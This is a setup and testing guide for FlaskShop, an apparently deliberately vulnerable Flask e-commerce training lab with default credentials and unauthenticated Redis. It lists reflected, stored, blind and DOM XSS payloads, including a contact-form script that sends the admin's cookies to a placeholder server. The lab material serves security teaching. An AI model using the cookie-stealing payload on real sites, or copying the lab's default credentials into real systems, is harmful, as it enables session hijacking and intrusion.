# Local Deployment Guide - FlaskShop E-Commerce Platform

## Quick Start with Docker Compose

### Prerequisites
- Docker Desktop or Docker Engine installed
- Docker Compose v2.0 or higher
- At least 4GB RAM available for containers

### 1. Start the Application
```bash
# Navigate to lab directory
cd labs/lab-02-python-ecommerce

# Start all services
docker-compose up -d

# View logs (optional)
docker-compose logs -f web
```

### 2. Access the Application
- **FlaskShop Web Application**: http://localhost:5000
- **pgAdmin (Database Management)**: http://localhost:8080
  - Username: admin@flaskshop.com
  - Password: admin123
- **Redis Commander**: http://localhost:8081

### 3. Default Credentials
- **Admin User**: admin / admin123
- **Test User**: user / password123

## Services Overview

The Docker Compose setup includes:

| Service | Port | Purpose | Vulnerabilities |
|---------|------|---------|----------------|
| **web** | 5000 | Flask application | XSS, weak configuration |
| **db** | 5432 | PostgreSQL database | Default credentials |
| **redis** | 6379 | Session storage | No authentication |
| **pgadmin** | 8080 | Database admin interface | Default credentials |
| **redis-commander** | 8081 | Redis admin interface | No authentication |

## Testing the Vulnerabilities

### 1. Reflected XSS Testing
```bash
# Test search functionality
curl "http://localhost:5000/search?q=<script>alert('XSS')</script>"

# Or use browser:
# Navigate to: http://localhost:5000/search?q=<img src=x onerror=alert('XSS')>
```

### 2. Stored XSS Testing
1. Register a new user account
2. Navigate to any product page
3. Submit a review with XSS payload:
   ```html
   <script>alert('Stored XSS in Reviews!')</script>
   ```
4. The payload will execute for all users viewing the product

### 3. Blind XSS Testing (Admin Panel)
1. Navigate to contact form: http://localhost:5000/contact
2. Submit message with payload:
   ```html
   <script>fetch('http://your-server.com/log?cookie='+document.cookie)</script>
   ```
3. Login as admin and view contacts to trigger the payload

### 4. DOM-based XSS Testing
1. Login and navigate to profile page
2. Update profile with malicious JavaScript
3. Check browser console for XSS execution

## Stopping the Application

```bash
# Stop all services
docker-compose down

# Stop and remove volumes (reset data)
docker-compose down -v

# Remove all containers and images
docker-compose down --rmi all -v
```

## Troubleshooting

### Common Issues

1. **Port Conflicts**
   ```bash
   # Check what's using the ports
   netstat -tulpn | grep :5000
   
   # Modify docker-compose.yml port mapping if needed
   # Change "5000:5000" to "5001:5000" for web service
   ```

2. **Database Connection Issues**
   ```bash
   # Check database logs
   docker-compose logs db
   
   # Connect to database manually
   docker exec -it flaskshop-db psql -U flaskshop -d ecommerce
   ```

3. **Application Crashes**
   ```bash
   # Check application logs
   docker-compose logs web
   
   # Restart specific service
   docker-compose restart web
   ```

### Performance Optimization
```bash
# Monitor resource usage
docker stats

# Scale web service (if needed)
docker-compose up -d --scale web=2
```

## Development Mode

For development with code changes:

```bash
# Start with development override
docker-compose -f docker-compose.yml -f docker-compose.dev.yml up -d

# This enables:
# - Volume mounting for live code reloading
# - Debug mode with detailed error messages
# - Development database with test data
```

## Security Testing Commands

### Automated XSS Testing
```bash
# Using custom test scripts
python tests/xss_tests.py --target http://localhost:5000

# Using OWASP ZAP
zap-cli quick-scan --self-contained http://localhost:5000

# Using Burp Suite
# Configure proxy to http://localhost:8080
# Navigate through application manually
```

### Manual Testing Checklist
- [ ] Test search functionality with XSS payloads
- [ ] Submit malicious reviews with script tags
- [ ] Test profile update with JavaScript injection
- [ ] Submit contact forms with blind XSS payloads
- [ ] Check error pages for reflected XSS
- [ ] Test API endpoints for JSON-based XSS

## Next Steps
1. Complete XSS vulnerability testing
2. Review source code for security flaws
3. Practice remediation techniques
4. Deploy to AWS using DEPLOY_AWS.md
5. Proceed to Lab 03 for SSRF vulnerabilities
